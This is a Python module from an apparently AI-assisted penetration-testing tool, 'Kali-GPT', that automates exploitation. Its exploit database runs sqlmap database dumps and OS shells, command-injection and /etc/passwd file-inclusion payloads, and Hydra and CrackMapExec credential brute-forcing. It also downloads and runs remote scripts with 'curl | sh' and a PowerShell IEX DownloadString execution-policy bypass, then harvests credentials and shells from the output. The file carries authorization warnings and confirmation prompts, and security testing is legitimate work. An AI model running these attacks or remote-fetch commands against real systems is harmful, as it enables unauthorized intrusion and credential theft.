"""
Kali-GPT v4.1 - Exploit Automation Module

Automatically exploits discovered vulnerabilities:
- Maps vulnerabilities to exploits
- Generates custom payloads
- Executes exploitation with confirmation
- Handles post-exploitation

Author: Kali-GPT Team
Version: 4.1

‚ö†Ô∏è WARNING: Only use on systems you have explicit permission to test!
"""

import os
import re
import json
import shutil
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console()


# =============================================================================
# DATA CLASSES
# =============================================================================

class ExploitType(Enum):
    """Types of exploits"""
    SQLI = "sql_injection"
    XSS = "xss"
    RCE = "remote_code_execution"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    SSRF = "server_side_request_forgery"
    AUTH_BYPASS = "authentication_bypass"
    PRIV_ESC = "privilege_escalation"
    DEFAULT_CREDS = "default_credentials"
    CVE = "cve_exploit"
    CUSTOM = "custom"


@dataclass
class Vulnerability:
    """A discovered vulnerability"""
    id: str
    type: str
    target: str
    port: int = 0
    service: str = ""
    description: str = ""
    cve: str = ""
    cvss: float = 0.0
    details: Dict = field(default_factory=dict)


@dataclass
class Exploit:
    """An exploit for a vulnerability"""
    name: str
    type: ExploitType
    target_vuln: str  # Vulnerability type this exploits
    command: str
    payload: str = ""
    success_indicator: str = ""
    risk_level: str = "high"  # low, medium, high, critical
    requires_interaction: bool = False
    post_exploit: List[str] = field(default_factory=list)


@dataclass
class ExploitResult:
    """Result of exploitation attempt"""
    success: bool
    exploit: str
    target: str
    output: str
    credentials: List[Dict] = field(default_factory=list)
    shells: List[Dict] = field(default_factory=list)
    flags: List[str] = field(default_factory=list)
    error: str = ""


# =============================================================================
# EXPLOIT DATABASE
# =============================================================================

class ExploitDB:
    """
    Database of exploits mapped to vulnerability types.
    """
    
    def __init__(self):
        self.exploits = self._load_exploits()
    
    def _load_exploits(self) -> Dict[str, List[Exploit]]:
        """Load exploit definitions"""
        return {
            # SQL Injection
            "sql_injection": [
                Exploit(
                    name="SQLMap Auto",
                    type=ExploitType.SQLI,
                    target_vuln="sql_injection",
                    command="sqlmap -u '{url}' --batch --random-agent --level=3 --risk=2 --threads=5",
                    success_indicator="available databases",
                    risk_level="medium"
                ),
                Exploit(
                    name="SQLMap Dump",
                    type=ExploitType.SQLI,
                    target_vuln="sql_injection",
                    command="sqlmap -u '{url}' --batch --dump --threads=5",
                    success_indicator="dumped to",
                    risk_level="high"
                ),
                Exploit(
                    name="SQLMap Shell",
                    type=ExploitType.SQLI,
                    target_vuln="sql_injection",
                    command="sqlmap -u '{url}' --batch --os-shell",
                    success_indicator="os-shell",
                    risk_level="critical",
                    requires_interaction=True
                ),
            ],
            
            # Remote Code Execution
            "rce": [
                Exploit(
                    name="Command Injection Test",
                    type=ExploitType.RCE,
                    target_vuln="rce",
                    command="curl -s '{url}' --data 'cmd=id'",
                    payload="; id; whoami; uname -a",
                    success_indicator="uid=",
                    risk_level="critical"
                ),
            ],
            
            # Local File Inclusion
            "lfi": [
                Exploit(
                    name="LFI /etc/passwd",
                    type=ExploitType.LFI,
                    target_vuln="lfi",
                    command="curl -s '{url}?{param}=../../../etc/passwd'",
                    success_indicator="root:x:0:0",
                    risk_level="high"
                ),
                Exploit(
                    name="LFI Log Poisoning",
                    type=ExploitType.LFI,
                    target_vuln="lfi",
                    command="curl -s '{url}?{param}=../../../var/log/apache2/access.log'",
                    success_indicator="HTTP",
                    risk_level="high"
                ),
            ],
            
            # Default Credentials
            "default_creds": [
                Exploit(
                    name="Hydra SSH",
                    type=ExploitType.DEFAULT_CREDS,
                    target_vuln="ssh",
                    command="hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ssh -t 4 -V",
                    success_indicator="login:",
                    risk_level="medium"
                ),
                Exploit(
                    name="Hydra FTP",
                    type=ExploitType.DEFAULT_CREDS,
                    target_vuln="ftp",
                    command="hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt {target} ftp -t 4 -V",
                    success_indicator="login:",
                    risk_level="medium"
                ),
                Exploit(
                    name="Hydra HTTP Form",
                    type=ExploitType.DEFAULT_CREDS,
                    target_vuln="http_form",
                    command="hydra -L users.txt -P passwords.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
                    success_indicator="login:",
                    risk_level="medium"
                ),
            ],
            
            # SMB
            "smb": [
                Exploit(
                    name="SMB Anonymous",
                    type=ExploitType.AUTH_BYPASS,
                    target_vuln="smb",
                    command="smbclient -L //{target} -N",
                    success_indicator="Sharename",
                    risk_level="low"
                ),
                Exploit(
                    name="SMB EternalBlue Check",
                    type=ExploitType.CVE,
                    target_vuln="smb",
                    command="nmap -p445 --script smb-vuln-ms17-010 {target}",
                    success_indicator="VULNERABLE",
                    risk_level="critical"
                ),
                Exploit(
                    name="CrackMapExec",
                    type=ExploitType.DEFAULT_CREDS,
                    target_vuln="smb",
                    command="crackmapexec smb {target} -u users.txt -p passwords.txt",
                    success_indicator="[+]",
                    risk_level="medium"
                ),
            ],
            
            # Web vulnerabilities
            "web": [
                Exploit(
                    name="Nuclei Critical",
                    type=ExploitType.CVE,
                    target_vuln="web",
                    command="nuclei -u {url} -severity critical,high -silent",
                    success_indicator="[",
                    risk_level="varies"
                ),
                Exploit(
                    name="XSS Test",
                    type=ExploitType.XSS,
                    target_vuln="xss",
                    command="dalfox url '{url}' --skip-bav",
                    success_indicator="[POC]",
                    risk_level="medium"
                ),
            ],
            
            # Privilege Escalation
            "privesc": [
                Exploit(
                    name="LinPEAS",
                    type=ExploitType.PRIV_ESC,
                    target_vuln="linux",
                    command="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                    success_indicator="95%",
                    risk_level="low",
                    post_exploit=["Check highlighted findings", "Look for SUID binaries", "Check cron jobs"]
                ),
                Exploit(
                    name="WinPEAS",
                    type=ExploitType.PRIV_ESC,
                    target_vuln="windows",
                    command="powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"",
                    success_indicator="[+]",
                    risk_level="low"
                ),
            ],
        }
    
    def get_exploits_for_vuln(self, vuln_type: str) -> List[Exploit]:
        """Get exploits for a vulnerability type"""
        # Normalize vuln type
        vuln_type = vuln_type.lower().replace(' ', '_')
        
        # Direct match
        if vuln_type in self.exploits:
            return self.exploits[vuln_type]
        
        # Partial match
        for key, exploits in self.exploits.items():
            if vuln_type in key or key in vuln_type:
                return exploits
        
        return []
    
    def search_exploit(self, query: str) -> List[Exploit]:
        """Search for exploits"""
        results = []
        query = query.lower()
        
        for category, exploits in self.exploits.items():
            for exploit in exploits:
                if (query in exploit.name.lower() or 
                    query in exploit.target_vuln.lower() or
                    query in category):
                    results.append(exploit)
        
        return results


# =============================================================================
# EXPLOIT ENGINE
# =============================================================================

class ExploitEngine:
    """
    Automated exploitation engine.
    
    Capabilities:
    - Map vulnerabilities to exploits
    - Generate payloads
    - Execute with confirmation
    - Handle post-exploitation
    """
    
    def __init__(self, ai_service=None):
        self.ai = ai_service
        self.exploit_db = ExploitDB()
        self.results: List[ExploitResult] = []
        self.confirmed_exploits: List[str] = []
    
    def analyze_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Tuple[Vulnerability, List[Exploit]]]:
        """
        Analyze vulnerabilities and find matching exploits.
        
        Returns list of (vulnerability, matching_exploits) tuples.
        """
        matches = []
        
        for vuln in vulnerabilities:
            # Get exploits for this vuln type
            exploits = self.exploit_db.get_exploits_for_vuln(vuln.type)
            
            # Also check by service
            if vuln.service:
                service_exploits = self.exploit_db.get_exploits_for_vuln(vuln.service)
                exploits.extend(service_exploits)
            
            # Also check by CVE
            if vuln.cve:
                cve_exploits = self._search_cve_exploits(vuln.cve)
                exploits.extend(cve_exploits)
            
            if exploits:
                matches.append((vuln, list(set(exploits))))
        
        return matches
    
    def _search_cve_exploits(self, cve: str) -> List[Exploit]:
        """Search for CVE-specific exploits"""
        exploits = []
        
        # Check searchsploit
        if shutil.which('searchsploit'):
            result = subprocess.run(
                f"searchsploit -j {cve} 2>/dev/null",
                shell=True,
                capture_output=True,
                text=True
            )
            
            try:
                data = json.loads(result.stdout)
                for exp in data.get('RESULTS_EXPLOIT', [])[:3]:
                    exploits.append(Exploit(
                        name=exp.get('Title', 'Unknown'),
                        type=ExploitType.CVE,
                        target_vuln=cve,
                        command=f"searchsploit -x {exp.get('Path', '')}",
                        risk_level="high"
                    ))
            except:
                pass
        
        return exploits
    
    def generate_payload(self, exploit_type: str, target: str, params: Dict = None) -> str:
        """
        Generate a payload for the exploit.
        
        Uses AI to create custom payloads when available.
        """
        params = params or {}
        
        if self.ai:
            prompt = f"""Generate a {exploit_type} payload for target {target}.
Parameters: {params}

Provide ONLY the payload/command, nothing else.
Make it safe for testing (avoid destructive actions)."""
            
            return self.ai.ask(prompt).strip()
        
        # Default payloads
        default_payloads = {
            "sql_injection": "' OR '1'='1' --",
            "xss": "<script>alert('XSS')</script>",
            "lfi": "../../../etc/passwd",
            "rce": "; id",
            "ssrf": "http://127.0.0.1:80",
        }
        
        return default_payloads.get(exploit_type, "")
    
    def prepare_command(self, exploit: Exploit, target: str, params: Dict = None) -> str:
        """Prepare exploit command with parameters"""
        params = params or {}
        
        cmd = exploit.command
        
        # Replace placeholders
        cmd = cmd.replace('{target}', target)
        cmd = cmd.replace('{url}', params.get('url', f'http://{target}'))
        cmd = cmd.replace('{port}', str(params.get('port', 80)))
        cmd = cmd.replace('{param}', params.get('param', 'id'))
        
        return cmd
    
    def execute_exploit(self, exploit: Exploit, target: str, params: Dict = None,
                        confirm: bool = True) -> ExploitResult:
        """
        Execute an exploit.
        
        Args:
            exploit: The exploit to run
            target: Target host/URL
            params: Additional parameters
            confirm: Require user confirmation
        """
        params = params or {}
        
        # Prepare command
        cmd = self.prepare_command(exploit, target, params)
        
        # Show what we're about to do
        console.print(Panel(
            f"[bold]Exploit:[/bold] {exploit.name}\n"
            f"[bold]Type:[/bold] {exploit.type.value}\n"
            f"[bold]Target:[/bold] {target}\n"
            f"[bold]Risk:[/bold] {exploit.risk_level}\n"
            f"[bold]Command:[/bold] {cmd}",
            title="‚ö†Ô∏è Exploitation Attempt",
            border_style="yellow"
        ))
        
        # Confirm if required
        if confirm and exploit.risk_level in ['high', 'critical']:
            if not Confirm.ask(f"[red]Execute this {exploit.risk_level} risk exploit?[/red]", default=False):
                return ExploitResult(
                    success=False,
                    exploit=exploit.name,
                    target=target,
                    output="",
                    error="Cancelled by user"
                )
        
        # Execute
        console.print(f"\n[cyan]Executing {exploit.name}...[/cyan]")
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            output = result.stdout + result.stderr
            
            # Check for success
            success = False
            if exploit.success_indicator:
                success = exploit.success_indicator.lower() in output.lower()
            else:
                success = result.returncode == 0
            
            # Extract credentials if found
            credentials = self._extract_credentials(output)
            
            # Extract shells if found
            shells = self._extract_shells(output)
            
            # Extract flags
            flags = self._extract_flags(output)
            
            exploit_result = ExploitResult(
                success=success,
                exploit=exploit.name,
                target=target,
                output=output[:5000],
                credentials=credentials,
                shells=shells,
                flags=flags
            )
            
            self.results.append(exploit_result)
            
            if success:
                self.confirmed_exploits.append(exploit.name)
                console.print(f"[bold green]‚úì EXPLOIT SUCCESSFUL![/bold green]")
                
                if credentials:
                    console.print(f"[green]  Found {len(credentials)} credential(s)[/green]")
                if shells:
                    console.print(f"[green]  Got {len(shells)} shell(s)[/green]")
                if flags:
                    console.print(f"[green]  Found {len(flags)} flag(s)[/green]")
            else:
                console.print(f"[yellow]‚úó Exploit did not succeed[/yellow]")
            
            return exploit_result
            
        except subprocess.TimeoutExpired:
            return ExploitResult(
                success=False,
                exploit=exploit.name,
                target=target,
                output="",
                error="Command timed out"
            )
        except Exception as e:
            return ExploitResult(
                success=False,
                exploit=exploit.name,
                target=target,
                output="",
                error=str(e)
            )
    
    def _extract_credentials(self, output: str) -> List[Dict]:
        """Extract credentials from output"""
        credentials = []
        
        # Username:password patterns
        patterns = [
            r'(\w+):(\w+)@',
            r'login:\s*(\S+)\s+password:\s*(\S+)',
            r'user[name]*[:\s]+(\S+).*pass[word]*[:\s]+(\S+)',
            r'\[(\w+)\]\s+\[(\w+)\]',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            for match in matches:
                if len(match) >= 2:
                    credentials.append({
                        'username': match[0],
                        'password': match[1]
                    })
        
        return credentials
    
    def _extract_shells(self, output: str) -> List[Dict]:
        """Extract shell information from output"""
        shells = []
        
        # Shell indicators
        if 'os-shell' in output.lower():
            shells.append({'type': 'os-shell', 'via': 'sqlmap'})
        if 'meterpreter' in output.lower():
            shells.append({'type': 'meterpreter', 'via': 'metasploit'})
        if re.search(r'(www-data|root|admin)@', output):
            shells.append({'type': 'shell', 'via': 'rce'})
        
        return shells
    
    def _extract_flags(self, output: str) -> List[str]:
        """Extract CTF-style flags"""
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'HTB\{[^}]+\}',
        ]
        
        flags = []
        for pattern in patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            flags.extend(matches)
        
        return list(set(flags))
    
    def auto_exploit(self, vulnerabilities: List[Vulnerability], 
                     max_attempts: int = 10,
                     confirm_each: bool = True) -> List[ExploitResult]:
        """
        Automatically attempt exploitation of vulnerabilities.
        
        Args:
            vulnerabilities: List of discovered vulnerabilities
            max_attempts: Maximum exploitation attempts
            confirm_each: Confirm before each exploit
        """
        results = []
        attempts = 0
        
        # Analyze and get exploit matches
        matches = self.analyze_vulnerabilities(vulnerabilities)
        
        if not matches:
            console.print("[yellow]No matching exploits found[/yellow]")
            return results
        
        console.print(f"\n[cyan]Found {len(matches)} vulnerability/exploit matches[/cyan]\n")
        
        # Sort by risk (critical first)
        risk_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        matches.sort(key=lambda x: min([risk_order.get(e.risk_level, 4) for e in x[1]]))
        
        for vuln, exploits in matches:
            if attempts >= max_attempts:
                console.print(f"\n[yellow]Reached max attempts ({max_attempts})[/yellow]")
                break
            
            console.print(f"\n[bold]Vulnerability: {vuln.type}[/bold]")
            console.print(f"  Target: {vuln.target}")
            console.print(f"  Available exploits: {len(exploits)}")
            
            for exploit in exploits[:3]:  # Try up to 3 exploits per vuln
                if attempts >= max_attempts:
                    break
                
                attempts += 1
                
                result = self.execute_exploit(
                    exploit,
                    vuln.target,
                    params=vuln.details,
                    confirm=confirm_each
                )
                
                results.append(result)
                
                # If successful, move to next vuln
                if result.success:
                    break
        
        return results
    
    def get_summary(self) -> Dict:
        """Get exploitation summary"""
        return {
            'total_attempts': len(self.results),
            'successful': sum(1 for r in self.results if r.success),
            'failed': sum(1 for r in self.results if not r.success),
            'credentials_found': sum(len(r.credentials) for r in self.results),
            'shells_obtained': sum(len(r.shells) for r in self.results),
            'flags_captured': sum(len(r.flags) for r in self.results),
            'confirmed_exploits': self.confirmed_exploits
        }


# =============================================================================
# INTERACTIVE MENU
# =============================================================================

async def exploit_menu(ai_service, vulnerabilities: List = None, target: str = None):
    """Interactive exploitation menu"""
    
    console.print(Panel(
        "[bold red]üí• EXPLOIT AUTOMATION[/bold red]\n\n"
        "[yellow]‚ö†Ô∏è  WARNING: Only use on systems you own or have permission to test![/yellow]\n\n"
        "Capabilities:\n"
        "  üîç Map vulnerabilities to exploits\n"
        "  ‚ö° Auto-generate payloads\n"
        "  üéØ Execute with confirmation\n"
        "  üîë Extract credentials\n"
        "  üêö Obtain shells\n\n"
        "[dim]All exploits require confirmation before execution[/dim]",
        title="Exploit Engine",
        border_style="red"
    ))
    
    engine = ExploitEngine(ai_service)
    
    table = Table(show_header=False, box=box.ROUNDED)
    table.add_row("1", "üéØ Auto-Exploit Vulnerabilities")
    table.add_row("2", "üîç Search Exploits")
    table.add_row("3", "‚ö° Manual Exploit")
    table.add_row("4", "üîß Generate Payload")
    table.add_row("5", "üìä Exploitation Summary")
    table.add_row("b", "‚¨ÖÔ∏è  Back")
    console.print(table)
    
    choice = Prompt.ask("\nSelect", default="b")
    
    if choice == '1':
        # Auto-exploit
        if not vulnerabilities:
            console.print("\n[yellow]No vulnerabilities loaded. Enter manually:[/yellow]")
            target = Prompt.ask("Target")
            vuln_type = Prompt.ask("Vulnerability type (sqli, xss, lfi, rce, smb)")
            
            if target and vuln_type:
                vulnerabilities = [Vulnerability(
                    id="manual_1",
                    type=vuln_type,
                    target=target
                )]
        
        if vulnerabilities:
            console.print(f"\n[cyan]Analyzing {len(vulnerabilities)} vulnerabilities...[/cyan]")
            results = engine.auto_exploit(vulnerabilities, confirm_each=True)
            
            # Show summary
            summary = engine.get_summary()
            console.print(Panel(
                f"[bold]Attempts:[/bold] {summary['total_attempts']}\n"
                f"[bold]Successful:[/bold] {summary['successful']}\n"
                f"[bold]Credentials:[/bold] {summary['credentials_found']}\n"
                f"[bold]Shells:[/bold] {summary['shells_obtained']}\n"
                f"[bold]Flags:[/bold] {summary['flags_captured']}",
                title="üìä Exploitation Summary",
                border_style="green" if summary['successful'] > 0 else "yellow"
            ))
    
    elif choice == '2':
        # Search exploits
        query = Prompt.ask("Search query (e.g., 'sqli', 'smb', 'ssh')")
        if query:
            exploits = engine.exploit_db.search_exploit(query)
            
            if not exploits:
                console.print("[yellow]No exploits found[/yellow]")
            else:
                table = Table(title=f"Exploits for '{query}'", box=box.ROUNDED)
                table.add_column("Name")
                table.add_column("Type")
                table.add_column("Risk")
                
                for exp in exploits:
                    risk_color = {'critical': 'red', 'high': 'yellow', 'medium': 'blue'}.get(exp.risk_level, 'dim')
                    table.add_row(
                        exp.name,
                        exp.target_vuln,
                        f"[{risk_color}]{exp.risk_level}[/{risk_color}]"
                    )
                
                console.print(table)
    
    elif choice == '3':
        # Manual exploit
        target = Prompt.ask("Target (IP/URL)")
        vuln_type = Prompt.ask("Vulnerability type")
        
        if target and vuln_type:
            exploits = engine.exploit_db.get_exploits_for_vuln(vuln_type)
            
            if not exploits:
                console.print("[yellow]No matching exploits. Try: sqli, smb, web, lfi, default_creds[/yellow]")
            else:
                console.print(f"\nAvailable exploits for {vuln_type}:")
                for i, exp in enumerate(exploits, 1):
                    console.print(f"  [{i}] {exp.name} ({exp.risk_level})")
                
                exp_choice = Prompt.ask("Select exploit", default="1")
                try:
                    exploit = exploits[int(exp_choice) - 1]
                    engine.execute_exploit(exploit, target, confirm=True)
                except:
                    console.print("[red]Invalid selection[/red]")
    
    elif choice == '4':
        # Generate payload
        exploit_type = Prompt.ask("Exploit type (sqli, xss, lfi, rce)")
        target = Prompt.ask("Target")
        
        if exploit_type and target:
            payload = engine.generate_payload(exploit_type, target)
            console.print(Panel(
                payload,
                title=f"Generated {exploit_type} Payload",
                border_style="cyan"
            ))
    
    elif choice == '5':
        # Summary
        summary = engine.get_summary()
        
        if summary['total_attempts'] == 0:
            console.print("[yellow]No exploitation attempts yet[/yellow]")
        else:
            console.print(Panel(
                f"[bold]Total Attempts:[/bold] {summary['total_attempts']}\n"
                f"[bold]Successful:[/bold] [green]{summary['successful']}[/green]\n"
                f"[bold]Failed:[/bold] [red]{summary['failed']}[/red]\n"
                f"[bold]Credentials Found:[/bold] {summary['credentials_found']}\n"
                f"[bold]Shells Obtained:[/bold] {summary['shells_obtained']}\n"
                f"[bold]Flags Captured:[/bold] {summary['flags_captured']}\n\n"
                f"[bold]Confirmed Exploits:[/bold]\n" +
                "\n".join([f"  ‚Ä¢ {e}" for e in summary['confirmed_exploits']]) if summary['confirmed_exploits'] else "  None",
                title="üìä Exploitation Summary",
                border_style="green" if summary['successful'] > 0 else "yellow"
            ))
    
    Prompt.ask("\nPress Enter to continue")


# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    print("Exploit Automation module loaded")
    print("‚ö†Ô∏è  Use responsibly and only on authorized systems!")
